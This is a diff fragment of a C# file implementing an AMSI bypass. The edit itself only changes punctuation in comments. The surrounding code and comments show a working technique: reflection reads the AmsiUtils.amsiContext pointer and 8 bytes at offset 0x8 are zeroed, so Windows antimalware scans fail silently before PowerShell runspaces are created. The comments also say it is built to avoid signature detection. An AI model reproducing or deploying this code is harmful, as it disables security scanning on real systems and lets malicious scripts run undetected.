@@ -2,7 +2,7 @@
 // C#-Native AMSI Bypass
 //
 // Disables AMSI from C# by corrupting the AmsiUtils.amsiContext field.
-// No PowerShell text signatures — avoids detection that amsi.txt triggers.
+// No PowerShell text signatures - avoids detection that amsi.txt triggers.
 //
 // Usage:
 //   AmsiBypass.Disable();  // call before creating any PowerShell runspace
@@ -33,7 +33,7 @@ public static class AmsiBypass
             IntPtr ctx = (IntPtr)ctxField.GetValue(null);
             if (ctx == IntPtr.Zero) return false;
 
-            // Zero 8 bytes at offset 0x8 — corrupts the AMSI context so scans fail silently
+            // Zero 8 bytes at offset 0x8 - corrupts the AMSI context so scans fail silently
             IntPtr target = IntPtr.Add(ctx, 0x8);
             Marshal.WriteInt64(target, 0);
 
